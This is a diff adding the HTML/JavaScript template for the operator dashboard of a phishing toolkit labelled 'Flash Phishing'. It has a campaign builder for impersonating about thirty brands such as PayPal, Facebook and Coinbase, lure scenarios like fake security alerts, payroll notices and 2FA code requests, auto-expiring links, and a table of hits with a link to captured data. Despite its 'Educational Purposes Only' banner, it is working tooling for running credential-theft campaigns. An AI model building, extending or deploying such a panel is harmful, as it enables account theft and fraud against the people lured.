@@ -1,0 +1,316 @@
+<!-- Developed by chadi0x (https://github.com/chadi0x) - Educational Purposes Only -->
+{% extends 'base.html' %}
+
+{% block content %}
+
+<!-- Header -->
+<div class="page-section-header">
+  <div>
+    <h2 class="mb-0">
+      <i class="fa-solid fa-bolt text-danger me-2" style="font-size:0.95rem;"></i>
+      Flash Phishing
+    </h2>
+    <p class="text-muted mb-0 mt-1" style="font-size:0.78rem;">
+      Deploy high-pressure phishing pages — links auto-expire within 24h
+    </p>
+  </div>
+  <a href="{{ url_for('flash_data') }}" class="tbl-action-btn px-3 gap-2" style="width:auto;">
+    <i class="fa-solid fa-database"></i>
+    <span style="font-size:0.78rem;">Captured Data</span>
+  </a>
+</div>
+
+<div class="row g-4">
+  <!-- ── Config Panel ──────────────────────────────────────────────────────── -->
+  <div class="col-md-5">
+    <div class="osint-container h-100 d-flex flex-column">
+      <div class="pf-section-label mb-3">Campaign Builder</div>
+
+      <!-- Tunnel indicator -->
+      <div class="tunnel-status-bar mb-3">
+        <span class="status-dot pulse-live" style="background:#10b981;"></span>
+        <span style="font-size:0.75rem; color:#10b981; font-weight:600;">Tunnel Active</span>
+        <span style="font-size:0.72rem; color:#334155; margin-left:auto;">Auto-routing enabled</span>
+      </div>
+
+      <form id="flashForm" class="d-flex flex-column gap-3 flex-grow-1">
+
+        <!-- Platform -->
+        <div>
+          <label class="form-label">1. Platform</label>
+          <select id="platformSelect" class="form-select"></select>
+        </div>
+
+        <div class="row g-2">
+          <!-- Language -->
+          <div class="col-6">
+            <label class="form-label">2. Language</label>
+            <select id="langSelect" class="form-select">
+              <option value="en">English (EN)</option>
+              <option value="fr">French (FR)</option>
+              <option value="ar">Arabic (AR)</option>
+            </select>
+          </div>
+          <!-- Scenario -->
+          <div class="col-6">
+            <label class="form-label">3. Scenario</label>
+            <select id="scenarioSelect" class="form-select" onchange="toggleMediaInput()">
+              <option value="group">Group Access</option>
+              <option value="video">Private Video</option>
+              <option value="verify">Get Verified</option>
+              <option value="security">Security Alert</option>
+              <option value="leak">Leaked Content</option>
+              <option value="payroll">Payroll / Salary</option>
+              <option value="subscription">Subscription Failed</option>
+              <option value="2fa">2FA Code Request</option>
+              <option value="wifi">Free WiFi Portal</option>
+              <option value="drive">Shared Document</option>
+            </select>
+          </div>
+        </div>
+
+        <!-- Media URL (conditional) -->
+        <div class="d-none" id="mediaInputGroup">
+          <label class="form-label">Media Thumbnail URL</label>
+          <input type="text" id="mediaUrl" class="form-control"
+                 placeholder="https://image-url.com/preview.jpg">
+        </div>
+
+        <!-- Redirect URL -->
+        <div>
+          <label class="form-label">Redirect After Login</label>
+          <input type="text" id="redirectUrl" class="form-control"
+                 placeholder="https://the-real-link.com">
+        </div>
+
+        <!-- Buttons -->
+        <div class="mt-auto d-flex flex-column gap-2">
+          <button type="button" onclick="deployFlash()" class="flash-deploy-btn">
+            <i class="fa-solid fa-rocket me-2"></i>Deploy Flash Link
+          </button>
+          <button type="button" onclick="killAllLinks()" class="flash-kill-btn">
+            <i class="fa-solid fa-skull me-2"></i>Kill All Links
+          </button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- ── Active Campaigns ────────────────────────────────────────────────── -->
+  <div class="col-md-7">
+    <div class="osint-container h-100">
+      <div class="pf-section-label mb-3">Active Campaigns</div>
+
+      <div class="table-responsive">
+        <table class="table table-dark table-hover align-middle mb-0">
+          <thead>
+            <tr>
+              <th>Platform</th>
+              <th>Scenario</th>
+              <th style="width:50px;">Hits</th>
+              <th style="width:80px;">Expires</th>
+              <th>Link</th>
+              <th style="width:40px;"></th>
+            </tr>
+          </thead>
+          <tbody>
+            {% for link in active_links %}
+            <tr>
+              <td>
+                <span class="platform-badge">{{ link.platform|title }}</span>
+                <span class="lang-badge ms-1">{{ link.language|upper }}</span>
+              </td>
+              <td style="font-size:0.78rem; color:#94a3b8;">{{ link.scenario|title }}</td>
+              <td>
+                <span class="fw-bold" style="color:#dc2626;">{{ link.hits }}</span>
+              </td>
+              <td>
+                <span class="text-danger countdown" data-expires="{{ link.expires_at.isoformat() }}"
+                      style="font-size:0.72rem; font-family:'Fira Code',monospace;">…</span>
+              </td>
+              <td>
+                <div class="link-copy-row">
+                  <input type="text" class="link-copy-input"
+                         value="{{ (saved_host or request.host_url).rstrip('/') }}/f/{{ link.id }}"
+                         readonly id="link-{{ link.id }}">
+                  <button class="tbl-action-btn" onclick="copyLink('link-{{ link.id }}')">
+                    <i class="fa-regular fa-copy"></i>
+                  </button>
+                </div>
+              </td>
+              <td>
+                <button class="tbl-action-btn"
+                        onclick="deleteLink('{{ link.id }}')"
+                        style="color:#dc2626; border-color:rgba(220,38,38,0.25);">
+                  <i class="fa-solid fa-trash"></i>
+                </button>
+              </td>
+            </tr>
+            {% else %}
+            <tr>
+              <td colspan="6">
+                <div class="empty-state py-5">
+                  <i class="fa-solid fa-bolt"></i>
+                  <p>No active flash campaigns. Deploy one to get started.</p>
+                </div>
+              </td>
+            </tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  const platforms = [
+    "Facebook","Instagram","Twitter","TikTok","Snapchat","LinkedIn","Google","Netflix",
+    "PayPal","Amazon","Microsoft","Yahoo","Dropbox","Spotify","Zoom","Slack","Adobe",
+    "WhatsApp","Telegram","Discord","Pinterest","Reddit","Twitch","Roblox","Fortnite",
+    "PubG","Binance","Coinbase","Steam","PlayStation"
+  ];
+
+  document.addEventListener('DOMContentLoaded', () => {
+    const sel = document.getElementById('platformSelect');
+    platforms.forEach(p => {
+      const opt = document.createElement('option');
+      opt.value = p.toLowerCase(); opt.textContent = p;
+      sel.appendChild(opt);
+    });
+    setInterval(updateTimers, 1000);
+  });
+
+  function toggleMediaInput() {
+    const s = document.getElementById('scenarioSelect').value;
+    document.getElementById('mediaInputGroup').classList.toggle('d-none', s !== 'video' && s !== 'leak');
+  }
+
+  function deployFlash() {
+    const btn = document.querySelector('button[onclick="deployFlash()"]');
+    const orig = btn.innerHTML;
+    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin me-2"></i>Generating…';
+    btn.disabled = true;
+
+    fetch('/api/flash/deploy', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        platform: document.getElementById('platformSelect').value,
+        lang: document.getElementById('langSelect').value,
+        scenario: document.getElementById('scenarioSelect').value,
+        redirect_url: document.getElementById('redirectUrl').value,
+        media_url: document.getElementById('mediaUrl').value
+      })
+    })
+    .then(r => r.json())
+    .then(data => {
+      if (data.status === 'success') location.reload();
+      else { btn.innerHTML = orig; btn.disabled = false; alert('Error'); }
+    });
+  }
+
+  function killAllLinks() {
+    if (!confirm('⚠ Kill ALL active flash links immediately?')) return;
+    fetch('/api/flash/kill_all', { method: 'POST' })
+      .then(r => r.json())
+      .then(d => { alert(d.message); location.reload(); });
+  }
+
+  function deleteLink(id) {
+    if (!confirm('Delete this campaign?')) return;
+    fetch('/api/flash/delete/' + id, { method: 'POST' }).then(() => location.reload());
+  }
+
+  function updateTimers() {
+    document.querySelectorAll('.countdown').forEach(el => {
+      const expires = new Date(el.dataset.expires.endsWith('Z') ? el.dataset.expires : el.dataset.expires + 'Z');
+      const dist = expires - new Date();
+      if (dist < 0) { el.textContent = 'ENDED'; el.style.color = '#475569'; }
+      else {
+        const h = Math.floor((dist % 86400000) / 3600000);
+        const m = Math.floor((dist % 3600000) / 60000);
+        el.textContent = `${h}h ${m}m`;
+      }
+    });
+  }
+
+  function copyLink(id) {
+    const el = document.getElementById(id);
+    navigator.clipboard.writeText(el.value).then(() => {
+      const btn = el.nextElementSibling;
+      btn.innerHTML = '<i class="fa-solid fa-check text-success"></i>';
+      setTimeout(() => btn.innerHTML = '<i class="fa-regular fa-copy"></i>', 1500);
+    });
+  }
+</script>
+
+<style>
+.tunnel-status-bar {
+  display:flex; align-items:center; gap:0.5rem;
+  background:rgba(16,185,129,0.05);
+  border:1px solid rgba(16,185,129,0.15);
+  border-radius:7px; padding:0.5rem 0.75rem;
+}
+
+.flash-deploy-btn {
+  display:flex; align-items:center; justify-content:center;
+  padding:0.65rem; border-radius:8px;
+  background:#dc2626; border:1px solid #dc2626;
+  color:#fff; font-weight:700; font-size:0.88rem;
+  cursor:pointer; font-family:'Outfit',sans-serif;
+  transition:all 150ms ease-out;
+}
+.flash-deploy-btn:hover { background:#b91c1c; box-shadow:0 4px 18px rgba(220,38,38,0.3); }
+
+.flash-kill-btn {
+  display:flex; align-items:center; justify-content:center;
+  padding:0.5rem; border-radius:8px;
+  background:rgba(255,255,255,0.04);
+  border:1px solid rgba(255,255,255,0.1);
+  color:#475569; font-size:0.82rem; font-weight:600;
+  cursor:pointer; font-family:'Outfit',sans-serif;
+  transition:all 150ms ease-out;
+}
+.flash-kill-btn:hover { background:rgba(220,38,38,0.08); border-color:rgba(220,38,38,0.25); color:#dc2626; }
+
+.link-copy-row {
+  display:flex; align-items:center; gap:0.4rem;
+}
+.link-copy-input {
+  background:rgba(0,0,0,0.3); border:1px solid rgba(255,255,255,0.08);
+  color:#64748b; border-radius:5px; padding:3px 8px;
+  font-family:'Fira Code',monospace; font-size:0.72rem; flex:1;
+}
+
+.platform-badge {
+  font-size:0.68rem; font-weight:700; text-transform:uppercase; letter-spacing:0.06em;
+  background:rgba(220,38,38,0.1); color:#dc2626;
+  border:1px solid rgba(220,38,38,0.2);
+  padding:2px 8px; border-radius:4px;
+}
+.lang-badge {
+  font-size:0.65rem; font-weight:600;
+  background:rgba(255,255,255,0.04); color:#64748b;
+  border:1px solid rgba(255,255,255,0.08);
+  padding:2px 6px; border-radius:3px;
+}
+
+.tbl-action-btn {
+  width:28px; height:28px;
+  background:rgba(255,255,255,0.04);
+  border:1px solid rgba(255,255,255,0.08);
+  border-radius:6px; color:#64748b;
+  display:inline-flex; align-items:center; justify-content:center;
+  font-size:0.72rem; cursor:pointer; text-decoration:none;
+  transition:all 150ms; font-family:inherit;
+}
+.tbl-action-btn:hover { background:rgba(255,255,255,0.09); color:#f1f5f9; }
+
+.pf-section-label {
+  font-size:0.65rem; font-weight:800; text-transform:uppercase;
+  letter-spacing:0.1em; color:#334155;
+}
+</style>
+
+{% endblock %}
